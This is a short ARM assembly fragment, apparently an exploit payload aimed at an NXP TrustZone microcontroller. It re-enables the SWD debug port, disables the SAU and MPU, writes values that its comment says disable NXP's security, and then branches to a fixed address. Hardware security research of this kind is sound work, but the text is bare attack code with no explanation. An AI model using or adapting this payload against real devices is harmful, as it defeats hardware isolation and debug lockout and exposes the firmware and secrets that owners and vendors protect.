fake:

# enable our SWD
movw r0, 0xfa0
movt r0, 0x5000
movw r1, 0x5678
movt r1, 0x1234
str r1, [r0, #0x14]
# what does this do, unclear
str r1, [r0, #0x10]
movw r1, 0xaaa
str r1, [r0, #0x4]
str r1, [r0, #0x8]

# disable SAU
movw r1, 0xedd0
movt r1, 0xe000
movw r0, 0
str  r0, [r1, #0x0]

# disable MPU
movw r1, 0xed94
movt r1, 0xe000
str  r0, [r1, #0x0]

# disable NXP's security
movw r1, 0xcff8
movt r1, 0x500a
movw r0, 0xaaaa
str r0, [r1, #0x4]
str r0, [r1, #0x0]

# now branch!
movw r5, 0x5401
movt r5, 0x1400
blx r5
